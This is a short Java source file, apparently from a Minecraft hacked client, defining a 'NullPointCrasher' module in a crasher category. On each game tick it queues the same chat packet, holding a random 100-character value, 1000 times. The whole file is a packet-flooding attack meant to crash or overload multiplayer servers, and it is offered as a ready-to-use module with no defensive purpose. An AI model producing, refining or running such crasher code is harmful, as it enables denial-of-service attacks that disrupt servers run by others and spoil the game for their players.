package net.sssssssthedev.SmartClient.module.crasher;

import net.minecraft.network.play.client.C01PacketChatMessage;
import net.sssssssthedev.SmartClient.module.Category;
import net.sssssssthedev.SmartClient.module.Module;
import net.sssssssthedev.SmartClient.utils.RandomUtils;
import org.lwjgl.input.Keyboard;

public class NullPointCrasher extends Module {

    public NullPointCrasher() {
        super("NullPointCrasher", Keyboard.KEY_0, Category.CRASHER);
    }

    public void onUpdate() {
        C01PacketChatMessage packet = new C01PacketChatMessage(RandomUtils.randomNumber(100));
        for (int i = 0; i < 1000; i++)
            this.mc.thePlayer.sendQueue.addToSendQueue(packet);
    }
}
